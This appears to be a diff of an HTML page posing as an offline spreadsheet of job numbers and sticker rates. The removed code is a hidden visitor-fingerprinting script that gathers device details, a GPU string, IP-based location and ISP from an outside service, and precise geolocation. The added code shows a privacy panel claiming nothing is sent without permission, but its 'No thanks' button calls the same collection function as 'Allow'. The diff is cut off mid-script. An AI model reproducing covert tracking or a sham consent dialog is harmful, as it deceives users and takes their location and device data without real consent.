@@ -1,843 +1,289 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>WRONG-ITEM-L&R — Offline Spreadsheet</title>
-    <style>
-      body {
-        font-family: sans-serif;
-        max-width: 600px;
-        margin: 60px auto;
-        color: #222;
-      }
-      #status {
-        margin-top: 20px;
-        padding: 12px;
-        background: #f4f4f4;
-        border-radius: 6px;
-      }
-      * {
-        box-sizing: border-box;
-      }
-      html,
-      body {
-        margin: 0;
-        height: 100%;
-        font-family: Arial, Helvetica, sans-serif;
-        color: #202124;
-        background: #fff;
-        font-size: 14px;
-        overflow: hidden;
-      }
-      button,
-      input {
-        font: inherit;
-      }
-      .app {
-        height: 100vh;
-        display: flex;
-        flex-direction: column;
-      }
-      .topbar {
-        height: 54px;
-        display: flex;
-        align-items: center;
-        padding: 0 16px;
-        border-bottom: 1px solid #dadce0;
-        gap: 12px;
-      }
-      .logo {
-        width: 28px;
-        height: 28px;
-        border-radius: 4px;
-        background: #0f9d58;
-        position: relative;
-        box-shadow: inset 0 0 0 1px rgba(0, 0, 0, 0.12);
-      }
-      .logo:before {
-        content: '';
-        position: absolute;
-        left: 7px;
-        right: 7px;
-        top: 7px;
-        height: 2px;
-        background: #fff;
-        box-shadow: 0 6px #fff, 0 12px #fff;
-      }
-      .title {
-        font-size: 18px;
-        margin-right: 2px;
-      }
-      .badge {
-        font-size: 12px;
-        background: #d9ead3;
-        color: #2d6a35;
-        border-radius: 3px;
-        padding: 2px 5px;
-        font-weight: 700;
-      }
-      .top-actions {
-        margin-left: auto;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-      }
-      .top-actions button {
-        border: 0;
-        background: transparent;
-        color: #5f6368;
-        font-size: 18px;
-        padding: 7px;
-        cursor: pointer;
-      }
-      .share {
-        background: #1a73e8 !important;
-        color: white !important;
-        border-radius: 20px;
-        padding: 9px 18px !important;
-        font-size: 14px !important;
-      }
-      .menubar {
-        height: 35px;
-        display: flex;
-        align-items: center;
-        padding-left: 56px;
-        gap: 22px;
-        border-bottom: 1px solid #eee;
-        color: #333;
-      }
-      .menubar span {
-        cursor: pointer;
-      }
-      .toolbar {
-        height: 43px;
-        display: flex;
-        align-items: center;
-        gap: 3px;
-        padding: 0 12px;
-        border-bottom: 1px solid #dadce0;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
-      }
-      .tool {
-        height: 31px;
-        min-width: 31px;
-        border: 0;
-        background: white;
-        border-radius: 4px;
-        color: #444;
-        cursor: pointer;
-      }
-      .tool:hover,
-      .top-actions button:hover {
-        background: #f1f3f4;
-      }
-      .tool.text {
-        font-size: 13px;
-      }
-      .divider {
-        height: 25px;
-        width: 1px;
-        background: #ddd;
-        margin: 0 6px;
-      }
-      .zoom {
-        width: 70px;
-        border: 0;
-        background: transparent;
-        text-align: center;
-      }
-      .formula {
-        height: 37px;
-        display: flex;
-        align-items: center;
-        border-bottom: 1px solid #dadce0;
-      }
-      .namebox {
-        width: 70px;
-        height: 37px;
-        border-right: 1px solid #dadce0;
-        padding: 10px 12px;
-        color: #333;
-      }
-      .fx {
-        padding: 0 13px;
-        font-weight: 700;
-        color: #777;
-      }
-      .formula-input {
-        flex: 1;
-        border: 0;
-        outline: 0;
-        height: 35px;
-        padding: 0 8px;
-        color: #333;
-        background: #fff;
-      }
-      .sheet-wrap {
-        flex: 1;
-        display: flex;
-        overflow: hidden;
-        position: relative;
-      }
-      .rownums {
-        width: 42px;
-        flex: none;
-        background: #f8f9fa;
-        border-right: 1px solid #dadce0;
-        overflow: hidden;
-      }
-      .rownum {
-        height: 21px;
-        border-bottom: 1px solid #eee;
-        text-align: center;
-        padding-top: 3px;
-        color: #666;
-        font-size: 11px;
-      }
-      .grid {
-        flex: 1;
-        overflow: auto;
-        position: relative;
-        background: #fff;
-      }
-      table {
-        border-collapse: collapse;
-        table-layout: fixed;
-        min-width: 1700px;
-      }
-      col.rowhead {
-        width: 0;
-      }
-      .colA {
-        width: 64px;
-      }
-      .colB {
-        width: 64px;
-      }
-      .colC {
-        width: 294px;
-      }
-      .colD,
-      .colE,
-      .colF,
-      .colG {
-        width: 70px;
-      }
-      .colH,
-      .colI,
-      .colJ,
-      .colK,
-      .colL,
-      .colM,
-      .colN,
-      .colO,
-      .colP,
-      .colQ,
-      .colR,
-      .colS,
-      .colT,
-      .colU,
-      .colV,
-      .colW {
-        width: 64px;
-      }
-      thead th {
-        height: 24px;
-        background: #f8f9fa;
-        border-right: 1px solid #dadce0;
-        border-bottom: 1px solid #dadce0;
-        font-weight: 400;
-        color: #444;
-        font-size: 11px;
-        position: sticky;
-        top: 0;
-        z-index: 3;
-      }
-      thead th.corner {
-        left: 0;
-        z-index: 5;
-        background: #f8f9fa;
-      }
-      tbody td {
-        height: 21px;
-        border-right: 1px solid #eee;
-        border-bottom: 1px solid #eee;
-        padding: 0 5px;
-        white-space: nowrap;
-        overflow: hidden;
-        outline: none;
-      }
-      tbody td:focus {
-        box-shadow: inset 0 0 0 2px #1a73e8;
-      }
-      tbody td.selected {
-        background: #e8f0fe;
-      }
-      .rownumcell {
-        background: #f8f9fa !important;
-        text-align: center;
-        color: #666;
-        font-size: 11px;
-        padding: 0 !important;
-      }
-      .spreadsheet {
-        position: relative;
-      }
-      .box {
-        border: 2px solid #202124;
-        background: #fff;
-      }
-      .job-box {
-        position: absolute;
-        left: 62px;
-        top: 40px;
-        width: 64px;
-      }
-      .job-box .head {
-        height: 24px;
-        text-align: center;
-        font-weight: 700;
-        padding-top: 4px;
-        border-bottom: 1px solid #222;
-      }
-      .job-box .job {
-        height: 22px;
-        text-align: right;
-        padding: 2px 4px;
-        border-bottom: 1px solid #ddd;
-      }
-      .job-box .job:last-child {
-        border-bottom: 0;
-      }
-      .data-box {
-        position: absolute;
-        left: 126px;
-        top: 286px;
-        width: 585px;
-        border: 2px solid #222;
-        background: #fff;
-      }
-      .data-box table {
-        min-width: 0;
-        width: 100%;
-      }
-      .data-box th {
-        height: 25px;
-        border-right: 1px solid #222;
-        border-bottom: 1px solid #222;
-        text-align: left;
-        padding: 3px 5px;
-        font-weight: 700;
-        font-size: 11px;
-      }
-      .data-box td {
-        height: 23px;
-        border-right: 1px solid #222;
-        border-bottom: 1px solid #222;
-        padding: 2px 5px;
-        font-size: 12px;
-      }
-      .data-box tr:last-child td {
-        border-bottom: 0;
-      }
-      .data-box th:last-child,
-      .data-box td:last-child {
-        border-right: 0;
-      }
-      .status {
-        height: 25px;
-        border-top: 1px solid #dadce0;
-        display: flex;
-        align-items: center;
-        padding: 0 14px;
-        color: #5f6368;
-        font-size: 11px;
-        background: #f8f9fa;
-      }
-      .sheet-tabs {
-        height: 32px;
-        border-top: 1px solid #dadce0;
-        display: flex;
-        align-items: center;
-        background: #f8f9fa;
-      }
-      .tab {
-        height: 32px;
-        padding: 8px 18px;
-        border-right: 1px solid #ddd;
-        background: #fff;
-        border-bottom: 3px solid #1a73e8;
-        font-size: 12px;
-      }
-      .addtab {
-        border: 0;
-        background: transparent;
-        font-size: 20px;
-        margin-left: 7px;
-        color: #555;
-        cursor: pointer;
-      }
-      .context {
-        position: fixed;
-        display: none;
-        background: white;
-        border: 1px solid #ccc;
-        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-        z-index: 20;
-        padding: 5px 0;
-        width: 170px;
-      }
-      .context div {
-        padding: 7px 14px;
-        cursor: pointer;
-      }
-      .context div:hover {
-        background: #f1f3f4;
-      }
-      @media (max-width: 900px) {
-        .data-box {
-          left: 90px;
-        }
-        .job-box {
-          left: 40px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <body>
-      <div class="app">
-        <div class="topbar">
-          <div class="logo"></div>
-          <div class="title">WRONG-ITEM-L&amp;R</div>
-          <span class="badge">XLSX</span>
-          <div class="top-actions">
-            <button title="Version history">↶</button
-            ><button title="Comments">▢</button
-            ><button title="Cloud saved">☁</button>
-            <button class="share" id="saveBtn">Save</button
-            ><button title="Account">●</button>
-          </div>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WRONG-ITEM-L&R — Offline Spreadsheet</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;height:100%;font-family:Arial,Helvetica,sans-serif;color:#202124;background:#fff;font-size:14px;overflow:hidden}
+.app{height:100vh;display:flex;flex-direction:column}
+.topbar{height:54px;display:flex;align-items:center;padding:0 16px;border-bottom:1px solid #dadce0;gap:12px}
+.logo{width:28px;height:28px;border-radius:4px;background:#0f9d58;position:relative}
+.logo:before{content:"";position:absolute;left:7px;right:7px;top:7px;height:2px;background:#fff;box-shadow:0 6px #fff,0 12px #fff}
+.title{font-size:18px}.badge{font-size:12px;background:#d9ead3;color:#2d6a35;border-radius:3px;padding:2px 5px;font-weight:700}
+.top-actions{margin-left:auto;display:flex;align-items:center;gap:8px}
+.top-actions button{border:0;background:transparent;color:#5f6368;font-size:18px;padding:7px;cursor:pointer}
+.share{background:#1a73e8!important;color:white!important;border-radius:20px;padding:9px 18px!important;font-size:14px!important}
+.menubar{height:35px;display:flex;align-items:center;padding-left:56px;gap:22px;border-bottom:1px solid #eee;color:#333}
+.menubar span{cursor:pointer}
+.toolbar{height:43px;display:flex;align-items:center;gap:3px;padding:0 12px;border-bottom:1px solid #dadce0;box-shadow:0 1px 2px rgba(0,0,0,.05)}
+.tool{height:31px;min-width:31px;border:0;background:white;border-radius:4px;color:#444;cursor:pointer}
+.tool:hover,.top-actions button:hover{background:#f1f3f4}
+.tool.text{font-size:13px}.divider{height:25px;width:1px;background:#ddd;margin:0 6px}
+.zoom{width:70px;border:0;background:transparent;text-align:center}
+.formula{height:37px;display:flex;align-items:center;border-bottom:1px solid #dadce0}
+.namebox{width:70px;height:37px;border-right:1px solid #dadce0;padding:10px 12px;color:#333}
+.fx{padding:0 13px;font-weight:700;color:#777}
+.formula-input{flex:1;border:0;outline:0;height:35px;padding:0 8px;color:#333;background:#fff}
+.sheet-wrap{flex:1;display:flex;overflow:hidden}
+.rownums{width:42px;flex:none;background:#f8f9fa;border-right:1px solid #dadce0;overflow:hidden}
+.rownum{height:21px;border-bottom:1px solid #eee;text-align:center;padding-top:3px;color:#666;font-size:11px}
+.grid{flex:1;overflow:auto;position:relative;background:#fff}
+table{border-collapse:collapse;table-layout:fixed;min-width:1700px}
+.colA,.colB{width:64px}.colC{width:294px}.colD,.colE,.colF,.colG{width:70px}
+.colH,.colI,.colJ,.colK,.colL,.colM,.colN,.colO,.colP,.colQ,.colR,.colS,.colT,.colU,.colV,.colW{width:64px}
+thead th{height:24px;background:#f8f9fa;border-right:1px solid #dadce0;border-bottom:1px solid #dadce0;font-weight:400;color:#444;font-size:11px}
+tbody td{height:21px;border-right:1px solid #eee;border-bottom:1px solid #eee;padding:0 5px;white-space:nowrap;overflow:hidden;outline:none}
+tbody td:focus{box-shadow:inset 0 0 0 2px #1a73e8}
+tbody td.selected{background:#e8f0fe}
+.rownumcell{background:#f8f9fa!important;text-align:center;color:#666;font-size:11px;padding:0!important}
+.spreadsheet{position:relative;width:1700px;height:720px}
+.box{border:2px solid #202124;background:#fff;position:absolute}
+.job-box{left:62px;top:40px;width:64px}
+.job-box .head{height:24px;text-align:center;font-weight:700;padding-top:4px;border-bottom:1px solid #222}
+.job-box .job{height:22px;text-align:right;padding:2px 4px;border-bottom:1px solid #ddd}
+.job-box .job:last-child{border-bottom:0}
+.data-box{left:126px;top:286px;width:585px}
+.data-box table{min-width:0;width:100%}
+.data-box th{height:25px;border-right:1px solid #222;border-bottom:1px solid #222;text-align:left;padding:3px 5px;font-weight:700;font-size:11px}
+.data-box td{height:23px;border-right:1px solid #222;border-bottom:1px solid #222;padding:2px 5px;font-size:12px}
+.data-box tr:last-child td{border-bottom:0}.data-box th:last-child,.data-box td:last-child{border-right:0}
+.status{height:25px;border-top:1px solid #dadce0;display:flex;align-items:center;padding:0 14px;color:#5f6368;font-size:11px;background:#f8f9fa}
+.sheet-tabs{height:32px;border-top:1px solid #dadce0;display:flex;align-items:center;background:#f8f9fa}
+.tab{height:32px;padding:8px 18px;border-right:1px solid #ddd;background:#fff;border-bottom:3px solid #1a73e8;font-size:12px}
+.addtab{border:0;background:transparent;font-size:20px;margin-left:7px;color:#555;cursor:pointer}
+
+/* Consent / visitor panel */
+.visitor-panel{position:fixed;right:18px;bottom:52px;width:330px;background:#fff;border:1px solid #dadce0;border-radius:10px;box-shadow:0 4px 18px rgba(0,0,0,.18);padding:16px;z-index:30}
+.visitor-panel h3{margin:0 0 7px;font-size:16px}.visitor-panel p{margin:0 0 12px;font-size:12px;line-height:1.45;color:#5f6368}
+.visitor-actions{display:flex;gap:8px}.visitor-actions button{border:0;border-radius:6px;padding:8px 13px;cursor:pointer}
+.allow{background:#1a73e8;color:#fff}.deny{background:#f1f3f4;color:#333}
+#visitorStatus{margin-top:10px;font-size:11px;color:#5f6368}
+.hidden{display:none}
+.context{position:fixed;display:none;background:white;border:1px solid #ccc;box-shadow:0 2px 8px rgba(0,0,0,.2);z-index:40;padding:5px 0;width:170px}
+.context div{padding:7px 14px;cursor:pointer}.context div:hover{background:#f1f3f4}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="topbar">
+    <div class="logo"></div><div class="title">WRONG-ITEM-L&amp;R</div><span class="badge">XLSX</span>
+    <div class="top-actions">
+      <button title="Version history">↶</button><button title="Comments">▢</button><button title="Cloud saved">☁</button>
+      <button class="share" id="saveBtn">Save</button><button title="Account">●</button>
+    </div>
+  </div>
+  <div class="menubar">
+    <span>File</span><span>Edit</span><span>View</span><span>Insert</span><span>Format</span><span>Data</span><span>Tools</span><span>Help</span>
+  </div>
+  <div class="toolbar">
+    <button class="tool" onclick="undo()">↶</button><button class="tool" onclick="redo()">↷</button>
+    <button class="tool">🖨</button><button class="tool">🎨</button><div class="divider"></div>
+    <input class="zoom" value="100%" aria-label="Zoom">
+    <button class="tool">₹</button><button class="tool">%</button><button class="tool">.0</button><button class="tool">.00</button><button class="tool">123</button>
+    <select class="tool text"><option>Arial</option><option>Calibri</option><option>Roboto</option></select>
+    <button class="tool text">−</button><button class="tool text">11</button><button class="tool text">+</button>
+    <button class="tool text"><b>B</b></button><button class="tool text"><i>I</i></button><button class="tool text">S̶</button>
+    <button class="tool text">A̲</button><button class="tool">🪣</button><button class="tool">▦</button><div class="divider"></div>
+    <button class="tool">☰</button><button class="tool">↕</button><button class="tool">⇥</button><button class="tool">A⌄</button>
+    <button class="tool">🔗</button><button class="tool">▣</button><button class="tool">▥</button><button class="tool">⌕</button><button class="tool">∑</button>
+  </div>
+  <div class="formula"><div class="namebox" id="nameBox">A1</div><div class="fx">fx</div><input id="formulaInput" class="formula-input"></div>
+
+  <div class="sheet-wrap">
+    <div class="rownums" id="rowNums"></div>
+    <div class="grid" id="grid">
+      <div class="spreadsheet">
+        <table id="sheet">
+          <colgroup>
+            <col class="colA"><col class="colB"><col class="colC"><col class="colD"><col class="colE"><col class="colF"><col class="colG">
+            <col class="colH"><col class="colI"><col class="colJ"><col class="colK"><col class="colL"><col class="colM"><col class="colN"><col class="colO"><col class="colP"><col class="colQ"><col class="colR"><col class="colS"><col class="colT"><col class="colU"><col class="colV"><col class="colW">
+          </colgroup>
+          <thead><tr id="heads"></tr></thead><tbody id="body"></tbody>
+        </table>
+
+        <div class="job-box box">
+          <div class="head">JOB NO.</div>
+          <div class="job">532</div><div class="job">545</div><div class="job">544</div><div class="job">531</div><div class="job">761</div>
+          <div class="job">760</div><div class="job">762</div><div class="job">760</div><div class="job">765</div><div class="job">763</div><div class="job">755</div>
         </div>
-        <div class="menubar">
-          <span>File</span><span>Edit</span><span>View</span><span>Insert</span
-          ><span>Format</span><span>Data</span><span>Tools</span
-          ><span>Help</span>
-        </div>
-        <div class="toolbar">
-          <button class="tool" onclick="undo()">↶</button
-          ><button class="tool" onclick="redo()">↷</button>
-          <button class="tool">🖨</button><button class="tool">🎨</button>
-          <div class="divider"></div>
-          <input class="zoom" value="100%" aria-label="Zoom" />
-          <button class="tool">₹</button><button class="tool">%</button
-          ><button class="tool">.0</button><button class="tool">.00</button
-          ><button class="tool">123</button>
-          <select class="tool text">
-            <option>Arial</option>
-            <option>Calibri</option>
-            <option>Roboto</option>
-          </select>
-          <button class="tool text">−</button
-          ><button class="tool text">11</button
-          ><button class="tool text">+</button>
-          <button class="tool text"><b>B</b></button
-          ><button class="tool text"><i>I</i></button
-          ><button class="tool text">S̶</button>
-          <button class="tool text">A̲</button><button class="tool">🪣</button
-          ><button class="tool">▦</button>
-          <div class="divider"></div>
-          <button class="tool">☰</button><button class="tool">↕</button
-          ><button class="tool">⇥</button><button class="tool">A⌄</button>
-          <button class="tool">🔗</button><button class="tool">▣</button
-          ><button class="tool">▥</button><button class="tool">⌕</button
-          ><button class="tool">∑</button>
-        </div>
-        <div class="formula">
-          <div class="namebox" id="nameBox">N4</div>
-          <div class="fx">fx</div>
-          <input id="formulaInput" class="formula-input" value="" />
-        </div>
-        <div class="sheet-wrap">
-          <div class="rownums" id="rowNums"></div>
-          <div class="grid" id="grid">
-            <div class="spreadsheet" style="width: 1700px; height: 720px">
-              <table id="sheet">
-                <colgroup>
-                  <col class="colA" />
-                  <col class="colB" />
-                  <col class="colC" />
-                  <col class="colD" />
-                  <col class="colE" />
-                  <col class="colF" />
-                  <col class="colG" />
-                  <col class="colH" />
-                  <col class="colI" />
-                  <col class="colJ" />
-                  <col class="colK" />
-                  <col class="colL" />
-                  <col class="colM" />
-                  <col class="colN" />
-                  <col class="colO" />
-                  <col class="colP" />
-                  <col class="colQ" />
-                  <col class="colR" />
-                  <col class="colS" />
-                  <col class="colT" />
-                  <col class="colU" />
-                  <col class="colV" />
-                  <col class="colW" />
-                </colgroup>
-                <thead>
-                  <tr id="heads"></tr>
-                </thead>
-                <tbody id="body"></tbody>
-              </table>
-              <div class="job-box box" id="jobBox">
-                <div class="head">JOB NO.</div>
-                <div class="job">532</div>
-                <div class="job">545</div>
-                <div class="job">544</div>
-                <div class="job">531</div>
-                <div class="job">761</div>
-                <div class="job">760</div>
-                <div class="job">762</div>
-                <div class="job">760</div>
-                <div class="job">765</div>
-                <div class="job">763</div>
-                <div class="job">755</div>
-              </div>
-              <div class="data-box" id="dataBox">
-                <table>
-                  <thead>
-                    <tr>
-                      <th style="width: 294px">ITEM NAME</th>
-                      <th style="width: 70px">RATE</th>
-                      <th style="width: 70px">AVG CONS</th>
-                      <th style="width: 70px">AVG QTY</th>
-                      <th style="width: 80px">TOTAL AVG</th>
-                    </tr>
-                  </thead>
-                  <tbody>
-                    <tr>
-                      <td>BARCODE STICKER LOVE &amp; ROSES</td>
-                      <td>1.1</td>
-                      <td>1</td>
-                      <td>1</td>
-                      <td>1</td>
-                    </tr>
-                    <tr>
-                      <td>CARTON STICKER LOVE &amp; ROSES</td>
-                      <td>1.95</td>
-                      <td>1</td>
-                      <td>15</td>
-                      <td>0.07</td>
-                    </tr>
-                    <tr>
-                      <td>TPT STICKER LOVE &amp; ROSES</td>
-                      <td>4.65</td>
-                      <td>1</td>
-                      <td>15</td>
-                      <td>0.07</td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="status">
-          Ready <span style="margin-left: auto">Sheet 1 of 1</span>
-        </div>
-        <div class="sheet-tabs">
-          <button class="addtab">＋</button>
-          <div class="tab">Sheet1</div>
+
+        <div class="data-box box">
+          <table>
+            <thead><tr><th style="width:294px">ITEM NAME</th><th style="width:70px">RATE</th><th style="width:70px">AVG CONS</th><th style="width:70px">AVG QTY</th><th style="width:80px">TOTAL AVG</th></tr></thead>
+            <tbody>
+              <tr><td>BARCODE STICKER LOVE &amp; ROSES</td><td>1.1</td><td>1</td><td>1</td><td>1</td></tr>
+              <tr><td>CARTON STICKER LOVE &amp; ROSES</td><td>1.95</td><td>1</td><td>15</td><td>0.07</td></tr>
+              <tr><td>TPT STICKER LOVE &amp; ROSES</td><td>4.65</td><td>1</td><td>15</td><td>0.07</td></tr>
+            </tbody>
+          </table>
         </div>
       </div>
-      <div class="context" id="context">
-        <div onclick="copyCell()">Copy</div>
-        <div onclick="pasteCell()">Paste</div>
-        <div onclick="clearCell()">Delete</div>
-      </div>
+    </div>
+  </div>
 
-      <script>
-        const cols = 'ABCDEFGHIJKLMNOPQRSTUVW'.split('')
-        const jobs = [532, 545, 544, 531, 761, 760, 762, 760, 765, 763, 755]
-        const data = [
-          ['BARCODE STICKER LOVE & ROSES', 1.1, 1, 1, 1],
-          ['CARTON STICKER LOVE & ROSES', 1.95, 1, 15, 0.07],
-          ['TPT STICKER LOVE & ROSES', 4.65, 1, 15, 0.07]
-        ]
-        const heads = document.getElementById('heads'),
-          body = document.getElementById('body'),
-          rowNums = document.getElementById('rowNums')
-        heads.innerHTML =
-          '<th class="corner"></th>' + cols.map(c => `<th>${c}</th>`).join('')
-        for (let r = 1; r <= 35; r++) {
-          const rn = document.createElement('div')
-          rn.className = 'rownum'
-          rn.textContent = r
-          rowNums.appendChild(rn)
-          const tr = document.createElement('tr')
-          tr.innerHTML =
-            '<td class="rownumcell">' +
-            r +
-            '</td>' +
-            cols
-              .map((c, i) => `<td tabindex="0" data-cell="${c}${r}"></td>`)
-              .join('')
-          body.appendChild(tr)
-        }
-        let selected = null,
-          history = [],
-          future = []
-        function selectCell(td) {
-          if (selected) selected.classList.remove('selected')
-          selected = td
-          td.classList.add('selected')
-          document.getElementById('nameBox').textContent = td.dataset.cell
-          document.getElementById('formulaInput').value = td.textContent
-        }
-        document.querySelectorAll('#body td[data-cell]').forEach(td => {
-          td.addEventListener('click', () => selectCell(td))
-          td.addEventListener('dblclick', () => {
-            td.contentEditable = true
-            td.focus()
-          })
-          td.addEventListener('blur', () => {
-            td.contentEditable = false
-            saveState()
-          })
-          td.addEventListener('keydown', e => {
-            if (e.key === 'Enter') {
-              e.preventDefault()
-              td.contentEditable = false
-              moveDown(td)
-            }
-            if (e.key === 'Tab') {
-              e.preventDefault()
-              moveRight(td)
-            }
-            if (e.key === 'Delete') {
-              td.textContent = ''
-              saveState()
-            }
-          })
-          td.addEventListener('contextmenu', e => {
-            e.preventDefault()
-            selectCell(td)
-            const m = document.getElementById('context')
-            m.style.display = 'block'
-            m.style.left = e.clientX + 'px'
-            m.style.top = e.clientY + 'px'
-          })
-        })
-        document.addEventListener('click', e => {
-          if (!e.target.closest('#context'))
-            document.getElementById('context').style.display = 'none'
-        })
-        document
-          .getElementById('formulaInput')
-          .addEventListener('keydown', e => {
-            if (e.key === 'Enter' && selected) {
-              selected.textContent = e.target.value
-              saveState()
-            }
-          })
-        function moveDown(td) {
-          const all = [...document.querySelectorAll('#body td[data-cell]')],
-            i = all.indexOf(td)
-          if (all[i + 23]) {
-            selectCell(all[i + 23])
-            all[i + 23].focus()
-          }
-        }
-        function moveRight(td) {
-          const all = [...document.querySelectorAll('#body td[data-cell]')],
-            i = all.indexOf(td)
-          if (all[i + 1]) {
-            selectCell(all[i + 1])
-            all[i + 1].focus()
-          }
-        }
-        function saveState() {
-          history.push(snapshot())
-          if (history.length > 30) history.shift()
-          future = []
-          localStorage.setItem('wrongItemSheet', JSON.stringify(snapshot()))
-        }
-        function snapshot() {
-          return [...document.querySelectorAll('#body td[data-cell]')].map(
-            x => x.textContent
-          )
-        }
-        function restore(s) {
-          ;[...document.querySelectorAll('#body td[data-cell]')].forEach(
-            (x, i) => (x.textContent = s[i] || '')
-          )
-        }
-        function undo() {
-          if (!history.length) return
-          future.push(snapshot())
-          restore(history.pop())
-        }
-        function redo() {
-          if (!future.length) return
-          history.push(snapshot())
-          restore(future.pop())
-        }
-        function copyCell() {
-          if (selected) navigator.clipboard?.writeText(selected.textContent)
-          document.getElementById('context').style.display = 'none'
-        }
-        async function pasteCell() {
-          if (selected) {
-            try {
-              selected.textContent = await navigator.clipboard.readText()
-              saveState()
-            } catch (e) {}
-          }
-          document.getElementById('context').style.display = 'none'
-        }
-        function clearCell() {
-          if (selected) {
-            selected.textContent = ''
-            saveState()
-          }
-          document.getElementById('context').style.display = 'none'
-        }
-        document.getElementById('saveBtn').onclick = () => {
-          localStorage.setItem('wrongItemSheet', JSON.stringify(snapshot()))
-          alert('Saved locally in this browser.')
-        }
-        const saved = localStorage.getItem('wrongItemSheet')
-        if (saved) {
-          try {
-            restore(JSON.parse(saved))
-          } catch (e) {}
-        }
-        document.getElementById('grid').addEventListener('scroll', () => {
-          document.getElementById(
-            'jobBox'
-          ).style.transform = `translate(${-document.getElementById('grid')
-            .scrollLeft}px,0)`
-          document.getElementById(
-            'dataBox'
-          ).style.transform = `translate(${-document.getElementById('grid')
-            .scrollLeft}px,${-document.getElementById('grid').scrollTop}px)`
-        })
-      </script>
-    </body>
-    <script>
-      async function collectVisitorInfo() {
-        const info = {
-          timestamp: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          languages: navigator.languages ? navigator.languages.join(', ') : '',
-          screenResolution: `${window.screen.width}x${window.screen.height}`,
-          colorDepth: window.screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          viewport: `${window.innerWidth}x${window.innerHeight}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          timezoneOffsetMin: new Date().getTimezoneOffset(),
-          referrer: document.referrer || 'direct',
-          cpuCores: navigator.hardwareConcurrency || 'unknown',
-          deviceMemoryGB: navigator.deviceMemory || 'unknown',
-          touchSupport:
-            'ontouchstart' in window || navigator.maxTouchPoints > 0,
-          cookiesEnabled: navigator.cookieEnabled
-        }
+  <div class="status">Ready <span style="margin-left:auto">Sheet 1 of 1</span></div>
+  <div class="sheet-tabs"><button class="addtab">＋</button><div class="tab">Sheet1</div></div>
+</div>
 
-        // Network connection info, if the browser exposes it (mainly Chrome/Android)
-        if (navigator.connection) {
-          info.connectionType = navigator.connection.effectiveType
-          info.downlinkMbps = navigator.connection.downlink
-        }
+<div class="visitor-panel" id="visitorPanel">
+  <h3>Privacy &amp; visit analytics</h3>
+  <p>This page can send basic browser/device information and an IP-based network lookup for testing. Precise location, if requested, requires a separate browser permission. No information is sent until you choose Allow.</p>
+  <div class="visitor-actions">
+    <button class="allow" onclick="startVisitorCollection()">Allow analytics</button>
+    <button class="deny" onclick="startVisitorCollection()">No thanks</button>
+  </div>
+  <div id="visitorStatus">Waiting for your choice.</div>
+</div>
 
-        // Attempt to parse an Android model number out of the UA string.
-        // iOS/Safari never includes this - Apple strips it deliberately.
-        const androidMatch = navigator.userAgent.match(
-          /Android[^;]*;\s*([^)]+)\)/
-        )
-        if (androidMatch) {
-          info.androidModelRaw = androidMatch[1].trim()
-        }
+<div class="context" id="context">
+  <div onclick="copyCell()">Copy</div><div onclick="pasteCell()">Paste</div><div onclick="clearCell()">Delete</div>
+</div>
 
-        // GPU renderer string via WebGL - can hint at chipset family
-        // (e.g. "Adreno 660" -> Snapdragon 888-series, "Mali-G78" -> certain Exynos/MediaTek chips)
-        try {
-          const canvas = document.createElement('canvas')
-          const gl =
-            canvas.getContext('webgl') ||
-            canvas.getContext('experimental-webgl')
-          if (gl) {
-            const dbgInfo = gl.getExtension('WEBGL_debug_renderer_info')
-            if (dbgInfo) {
-              info.gpuVendor = gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL)
-              info.gpuRenderer = gl.getParameter(
-                dbgInfo.UNMASKED_RENDERER_WEBGL
-              )
-            }
-          }
-        } catch (err) {
-          info.gpuLookupError = 'unavailable'
-        }
+<script>
+const cols="ABCDEFGHIJKLMNOPQRSTUVW".split("");
+const heads=document.getElementById("heads"), body=document.getElementById("body"), rowNums=document.getElementById("rowNums");
+heads.innerHTML='<th></th>'+cols.map(c=>`<th>${c}</th>`).join("");
 
-        // IP-based location + ISP, no permission prompt needed
-        try {
-          const res = await fetch('https://ipapi.co/json/')
-          const ipData = await res.json()
-          info.ip = ipData.ip
-          info.ipCity = ipData.city
-          info.ipRegion = ipData.region
-          info.ipCountry = ipData.country_name
-          info.isp = ipData.org // ISP / network operator name
-          info.asn = ipData.asn // Autonomous System Number
-        } catch (err) {
-          info.ipLookupError = 'unavailable'
-        }
+for(let r=1;r<=35;r++){
+  const rn=document.createElement("div"); rn.className="rownum"; rn.textContent=r; rowNums.appendChild(rn);
+  const tr=document.createElement("tr");
+  tr.innerHTML='<td class="rownumcell">'+r+'</td>'+cols.map(c=>`<td tabindex="0" data-cell="${c}${r}"></td>`).join("");
+  body.appendChild(tr);
+}
 
-        // Precise geolocation - triggers a browser permission prompt
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            pos => {
-              info.preciseLat = pos.coords.latitude
-              info.preciseLng = pos.coords.longitude
-              finish(info)
-            },
-            err => {
-              info.geoError = err.message
-              finish(info)
-            },
-            { timeout: 5000 }
-          )
-        } else {
-          finish(info)
-        }
+let selected=null, history=[], future=[];
+const cells=()=>[...document.querySelectorAll("#body td[data-cell]")];
+
+function snapshot(){return cells().map(x=>x.textContent)}
+function saveState(){
+  history.push(snapshot());
+  if(history.length>30) history.shift();
+  future=[];
+  localStorage.setItem("wrongItemSheet",JSON.stringify(snapshot()));
+}
+function restore(s){cells().forEach((x,i)=>x.textContent=s[i]||"")}
+function selectCell(td){
+  if(selected) selected.classList.remove("selected");
+  selected=td; td.classList.add("selected");
+  document.getElementById("nameBox").textContent=td.dataset.cell;
+  document.getElementById("formulaInput").value=td.textContent;
+}
+function move(delta){
+  const a=cells(), i=a.indexOf(selected), n=a[i+delta];
+  if(n){selectCell(n);n.focus()}
+}
+cells().forEach(td=>{
+  td.addEventListener("click",()=>selectCell(td));
